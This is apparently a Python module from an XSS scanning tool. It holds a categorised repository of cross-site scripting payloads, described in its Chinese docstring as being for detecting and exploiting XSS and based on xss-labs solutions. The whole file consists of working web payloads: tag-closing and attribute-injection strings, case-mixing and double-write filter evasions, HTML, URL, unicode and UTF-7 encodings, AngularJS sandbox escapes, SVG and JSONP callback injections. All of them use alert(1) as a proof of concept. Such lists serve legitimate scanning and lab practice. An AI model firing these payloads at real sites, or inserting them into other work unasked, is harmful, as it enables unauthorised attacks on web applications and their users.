"""
XSS Payload Repository
包含各种XSS payload，用于检测和利用XSS漏洞
参考 xss-labs 通关方法进行扩展
"""

PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
    ],

    "close_tag": [
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
    ],

    "attribute_injection": [
        "' onmouseover='alert(1)'",
        "\" onmouseover=alert(1) ",
        "' onmouseover=alert(1) ",
        "' onclick='alert(1)'",
        "\" onclick=alert(1) ",
        "' onclick=alert(1) ",
        "' onfocus='alert(1)' autofocus",
        "\" onfocus=alert(1) autofocus ",
        "' onfocus=alert(1) autofocus ",
        "\" onfocus=javascript:alert() type=\"text",
        "' onfocus=javascript:alert() type='text",
        "'level1.php?name=<img src=x onmouseover=alert()>'",
        "' onload='alert(1)'",
    ],

    "javascript_href": [
        "\"><a href=\"javascript:alert(1)\">click</a>",
        "'><a href='javascript:alert(1)'>click</a>",
    ],

    "case_mixing": [
        "<ScRipt>alert(1)</ScRipt>",
        "<Img SrC=x OnErRoR=alert(1)>",
        "<SvG/OnLoAd=alert(1)>",
    ],

    "double_write": [
        "' oonnmouseover=alert(1) ",
        "\" oonnmouseover=alert(1) ",
        "' oonnfocus=alert(1) autofocus ",
        "\" oonnfocus=alert(1) autofocus ",
        "<scscriptipt>alert(1)</scscriptipt>",
    ],

    "encoding_bypass": [
        "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;",
        "&#x3C;&#x69;&#x6D;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x78;&#x20;&#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3E;",
        "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;",
        "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;/* http:// */",
        "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        "jav&#97;script:alert(1)",
        "%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E",
        "%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        "%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        "\x3Cscript\x3Ealert(1)\x3C/script\x3E",
        "\u003Cscript\u003Ealert(1)\u003C/script\u003E",
        "\u200B<script>\u200Balert(1)\u200B</script>\u200B",
        "javascript:\u0000alert(1)",
        "javascript://%0Aalert(1)",
        "javascript:\u000Dalert(1)",
    ],

    "obfuscation": [
        "<scri" + "pt>alert(1)</sc" + "ript>",
        "<sCrIpT>alert(1)</sCrIpT>",
        "<script/**/alert(1)</script>",
        "<script/*foo*/alert(1)</script>",
        "<script>/*comment*/alert(1)//</script>",
        "<img src=x onerror=alert(1)//>",
        "<img src=x onerror='alert(1)'>",
        "<img src=x onerror=\"alert(1)\">",
        "<img/src=x/onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg/onload='alert(1)'>",
        "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>",
        "<iframe src=javascript:alert(1)>",
        "<iframe/src=javascript:alert(1)>",
        "<a href='javascript:alert(1)'>x</a>",
        "<a/href='javascript:alert(1)'>x</a>",
        "<form action=javascript:alert(1)><input type=submit></form>",
    ],

    "utf7_bypass": [
        "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
        "+ACI-script+ACI-alert(1)+ACI-/script+ACI-",
    ],

    "polyglot": [
        "\"'><script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
    ],

    "angular_js": [
        "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1}alert(1);//x=1')}}",
        "{{constructor.constructor('alert(1)')()}}",
        "{{alert(1)}}",
    ],

    "svg_xss": [
        "<svg/onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">",
        "<svg><desc/><!-- --><script>alert(1)</script></svg>",
        "<svg/onload='alert(1)'>",
        "<svg onload='alert(1)' xmlns='http://www.w3.org/2000/svg'>",
    ],

    "jsonp": [
        "alert(1)",
        "console.log(1);alert(1)//",
        ")alert(1);//",
        ");alert(1)//",
        "a=1);alert(1)//",
    ],
}

PAYLOAD_CATEGORIES = {
    "basic": "基础XSS payload",
    "close_tag": "标签闭合payload",
    "attribute_injection": "属性注入payload",
    "javascript_href": "JavaScript href绕过",
    "case_mixing": "大小写混合绕过",
    "double_write": "双写绕过",
    "encoding_bypass": "编码绕过",
    "polyglot": "多上下文payload",
    "angular_js": "AngularJS表达式注入",
    "svg_xss": "SVG XSS payload",
    "jsonp": "JSONP callback注入",
    "obfuscation": "混淆payload",
    "utf7_bypass": "UTF-7编码绕过",
}
